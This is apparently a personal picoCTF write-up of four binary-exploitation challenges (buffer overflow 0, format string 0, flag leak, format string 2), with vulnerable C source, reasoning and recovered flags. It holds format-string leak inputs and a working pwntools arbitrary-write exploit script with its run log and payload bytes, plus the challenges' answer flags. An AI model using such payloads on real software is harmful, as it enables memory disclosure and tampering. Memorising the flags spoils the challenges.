# buffer overflow 0
## Problem
- We have to overflow the correct buffer.
## Thought Process
- We have a program and a source code in C.
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>

#define FLAGSIZE_MAX 64

char flag[FLAGSIZE_MAX];

void sigsegv_handler(int sig) {
  printf("%s\n", flag);
  fflush(stdout);
  exit(1);
}

void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}

int main(int argc, char **argv){
  
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }
  
  fgets(flag,FLAGSIZE_MAX,f);
  signal(SIGSEGV, sigsegv_handler); // Set up signal handler
  
  gid_t gid = getegid();
  setresgid(gid, gid, gid);


  printf("Input: ");
  fflush(stdout);
  char buf1[100];
  gets(buf1); 
  vuln(buf1);
  printf("The program will exit now\n");
  return 0;
}
```
- Buffer size is 16, so try entering a length greater than that.
flag:`picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}`
# Format String 0
## Problem
- Need to use our knowledge of format string "to make the customers happy"
- Binary and source code are available
## Thought Process
- Format String is just a format specifier.
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <signal.h>
#include <unistd.h>
#include <sys/types.h>

#define BUFSIZE 32
#define FLAGSIZE 64

char flag[FLAGSIZE];

void sigsegv_handler(int sig) {
    printf("\n%s\n", flag);
    fflush(stdout);
    exit(1);
}

int on_menu(char *burger, char *menu[], int count) {
    for (int i = 0; i < count; i++) {
        if (strcmp(burger, menu[i]) == 0)
            return 1;
    }
    return 0;
}

void serve_patrick();

void serve_bob();


int main(int argc, char **argv){
    FILE *f = fopen("flag.txt", "r");
    if (f == NULL) {
        printf("%s %s", "Please create 'flag.txt' in this directory with your",
                        "own debugging flag.\n");
        exit(0);
    }

    fgets(flag, FLAGSIZE, f);
    signal(SIGSEGV, sigsegv_handler);

    gid_t gid = getegid();
    setresgid(gid, gid, gid);

    serve_patrick();
  
    return 0;
}

void serve_patrick() {
    printf("%s %s\n%s\n%s %s\n%s",
            "Welcome to our newly-opened burger place Pico 'n Patty!",
            "Can you help the picky customers find their favorite burger?",
            "Here comes the first customer Patrick who wants a giant bite.",
            "Please choose from the following burgers:",
            "Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice1[BUFSIZE];
    scanf("%s", choice1);
    char *menu1[3] = {"Breakf@st_Burger", "Gr%114d_Cheese", "Bac0n_D3luxe"};
    if (!on_menu(choice1, menu1, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        int count = printf(choice1);
        if (count > 2 * BUFSIZE) {
            serve_bob();
        } else {
            printf("%s\n%s\n",
                    "Patrick is still hungry!",
                    "Try to serve him something of larger size!");
            fflush(stdout);
        }
    }
}

void serve_bob() {
    printf("\n%s %s\n%s %s\n%s %s\n%s",
            "Good job! Patrick is happy!",
            "Now can you serve the second customer?",
            "Sponge Bob wants something outrageous that would break the shop",
            "(better be served quick before the shop owner kicks you out!)",
            "Please choose from the following burgers:",
            "Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak",
            "Enter your recommendation: ");
    fflush(stdout);

    char choice2[BUFSIZE];
    scanf("%s", choice2);
    char *menu2[3] = {"Pe%to_Portobello", "$outhwest_Burger", "Cla%sic_Che%s%steak"};
    if (!on_menu(choice2, menu2, 3)) {
        printf("%s", "There is no such burger yet!\n");
        fflush(stdout);
    } else {
        printf(choice2);
        fflush(stdout);
    }
}
```
- Quite a simple problem here, suggest the recommendations as the ones which have a format specifier in the name, causing it to segfault and give the flag.
- flag: `picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_f89c1405}`
# flag leak
## Problem
- We have a program with some story we have to tell, we need to leak the flag somehow.
```C
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <wchar.h>
#include <locale.h>

#define BUFSIZE 64
#define FLAGSIZE 64

void readflag(char* buf, size_t len) {
  FILE *f = fopen("flag.txt","r");
  if (f == NULL) {
    printf("%s %s", "Please create 'flag.txt' in this directory with your",
                    "own debugging flag.\n");
    exit(0);
  }

  fgets(buf,len,f); // size bound read
}

void vuln(){
   char flag[BUFSIZE];
   char story[128];

   readflag(flag, FLAGSIZE);

   printf("Tell me a story and then I'll tell you one >> ");
   scanf("%127s", story);
   printf("Here's a story - \n");
   printf(story);
   printf("\n");
}

int main(int argc, char **argv){

  setvbuf(stdout, NULL, _IONBF, 0);
  
  // Set the gid to the effective gid
  // this prevents /bin/sh from dropping the privileges
  gid_t gid = getegid();
  setresgid(gid, gid, gid);
  vuln();
  return 0;
}
```
## Thought Process
- We see that `%127s` limits the overflow from occurring. However, the printf(story) does not have a format specifier, similar to the previous problem. This could imply that passing a format string will cause it to return the flag.
- Simply passing a specifier might not suffice here. Passing a different format specifier returns a different output.
```console
Tell me a story and then I'll tell you one >> %d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d%d,%d,%d
Here's a story -
-544528,-544496,134517574623666213,1680157796,6236662131680157796,623666213,1680157796623666213,1680157796,6236662131680157796,623666213,1680157796623666213,1680157796,6236662131680157796,623666213,1680157796623666213,1680157796,6236662131680157796,623666213,1680157796623666213,1680157796,6236662131680157796,623666213,1680157796623666213,2436196,18687860322068206659,1798583116,16006139371731488838,1717973087,880038751828336995,1647468849,2103521845-72540160,456299264,
```
- Since `%s` doesn't give me anything, and `%d` gives gibberish, I might be able to obtain the flag is `%x` or hexadecimal.
```console
Tell me a story and then I'll tell you one >> %x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:%x:
Here's a story -
ffe990e0:ffe99100:8049346:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:78253a78:3a78253a:253a7825:253a78:6f636970:7b465443:6b34334c:5f676e31:67346c46:6666305f:3474535f:
```
- Converting the last few from hex to ASCII
![image](https://github.com/user-attachments/assets/3c535d6a-4430-423b-8516-ca197112b213)
- Looks like I will need more format specifiers, as the flag has only been printed partially
- printing from the stack at around 24 using `%24$s`
```
Tell me a story and then I'll tell you one >> %24$s
Here's a story -
CTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}
```
- So I learnt now that %x is used to read data off the stack, so this might be solvable using gdb as well.
- flag: `picoCTF{L34k1ng_Fl4g_0ff_St4ck_11a2b52a}`
# format string 2
## Thought Process
```gdb
#include <stdio.h>

int sus = 0x21737573;

int main() {
  char buf[1024];
  char flag[64];


  printf("You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?\n");
  fflush(stdout);
  scanf("%1024s", buf);
  printf("Here's your input: ");
  printf(buf);
  printf("\n");
  fflush(stdout);

  if (sus == 0x67616c66) {
    printf("I have NO clue how you did that, you must be a wizard. Here you go...\n");

    // Read in the flag
    FILE *fd = fopen("flag.txt", "r");
    fgets(flag, 64, fd);

    printf("%s", flag);
    fflush(stdout);
  }
  else {
    printf("sus = 0x%x\n", sus);
    printf("You can do better!\n");
    fflush(stdout);
  }

  return 0;
}
```
- `printf(buf)` prints unsanitised input, leading to a vulnerability.
- Somehow, we need to get `sus==0x67616c66`
- disassembling the `main` function
```gdb
Dump of assembler code for function main:
   0x00000000004011f6 <+0>:     endbr64
   0x00000000004011fa <+4>:     push   %rbp
   0x00000000004011fb <+5>:     mov    %rsp,%rbp
   0x00000000004011fe <+8>:     sub    $0x450,%rsp
   0x0000000000401205 <+15>:    mov    $0x402008,%edi
   0x000000000040120a <+20>:    call   0x4010b0 <puts@plt>
   0x000000000040120f <+25>:    mov    0x2e52(%rip),%rax        # 0x404068 <stdout@GLIBC_2.2.5>
   0x0000000000401216 <+32>:    mov    %rax,%rdi
   0x0000000000401219 <+35>:    call   0x4010e0 <fflush@plt>
   0x000000000040121e <+40>:    lea    -0x410(%rbp),%rax
   0x0000000000401225 <+47>:    mov    %rax,%rsi
   0x0000000000401228 <+50>:    mov    $0x40206e,%edi
   0x000000000040122d <+55>:    mov    $0x0,%eax
   0x0000000000401232 <+60>:    call   0x401100 <__isoc99_scanf@plt>
   0x0000000000401237 <+65>:    mov    $0x402075,%edi
   0x000000000040123c <+70>:    mov    $0x0,%eax
   0x0000000000401241 <+75>:    call   0x4010c0 <printf@plt>
   0x0000000000401246 <+80>:    lea    -0x410(%rbp),%rax
   0x000000000040124d <+87>:    mov    %rax,%rdi
   0x0000000000401250 <+90>:    mov    $0x0,%eax
   0x0000000000401255 <+95>:    call   0x4010c0 <printf@plt>
   0x000000000040125a <+100>:   mov    $0xa,%edi
   0x000000000040125f <+105>:   call   0x4010a0 <putchar@plt>
   0x0000000000401264 <+110>:   mov    0x2dfd(%rip),%rax        # 0x404068 <stdout@GLIBC_2.2.5>
   0x000000000040126b <+117>:   mov    %rax,%rdi
   0x000000000040126e <+120>:   call   0x4010e0 <fflush@plt>
   0x0000000000401273 <+125>:   mov    0x2de7(%rip),%eax        # 0x404060 <sus>
   0x0000000000401279 <+131>:   cmp    $0x67616c66,%eax
```
- The hint suggests the use of pwntools, so I should probably try using that.
- `# 0x404060 <sus>` this is the address of `sus`
```python3
from pwn import *

context.binary = ELF('./goof')  # Local binary for analysis

# target
HOST = 'rhea.picoctf.net'
PORT = 61833

# Function to send payload to target and return the output
def exec_fmt(payload): 
    conn = remote(HOST, PORT)  # Establish connection
    conn.sendline(payload)     # Send payload
    response = conn.recvall()  # Get all output
    conn.close()               # Close connection
    return response

# Automated format string analysis
autofmt = FmtStr(exec_fmt)
offset = autofmt.offset  # Determine stack offset

# Addresses and values to write
writes = {
    0x404060: 0x67616c66  # Address of `sus` and target value (`flag`)
}

# Generate payload using the detected offset
payload = fmtstr_payload(offset, writes)

# Connect to the remote server
p = remote(HOST, PORT)

# Send the crafted payload
p.sendline(payload)

# Receive and print the output
flag = p.recvall().decode()
print("Flag Output:")
print(flag)
```
- running the script
```console
root@LAPTOP-D1CLF8OQ:/mnt/c/Users/Divvyesh/Downloads# python3 exploit.py
[*] '/mnt/c/Users/Divvyesh/Downloads/goof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (194B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (191B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (191B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (195B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (189B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (191B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (200B)
[*] Closed connection to rhea.picoctf.net port 61833
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (204B)
[*] Closed connection to rhea.picoctf.net port 61833
[*] Found format string offset: 14
[+] Opening connection to rhea.picoctf.net on port 61833: Done
[+] Receiving all data: Done (594B)
[*] Closed connection to rhea.picoctf.net port 61833
Flag Output:
You don't have what it takes. Only a true wizard could change my suspicions. What do you have to say?
Here's your input:                                                                                                      uc    \x00                                                                                                                                                                                                                                                    \x00aaaaba`@@
I have NO clue how you did that, you must be a wizard. Here you go...
picoCTF{f0rm47_57r?_f0rm47_m3m_f43e6ccc}

Payload Used:
b'%102c%20$llnc%21$hhn%5c%22$hhn%245c%23$hhnaaaaba`@@\x00\x00\x00\x00\x00c@@\x00\x00\x00\x00\x00a@@\x00\x00\x00\x00\x00b@@\x00\x00\x00\x00\x00'
```
- `picoCTF{f0rm47_57r?_f0rm47_m3m_f43e6ccc}`
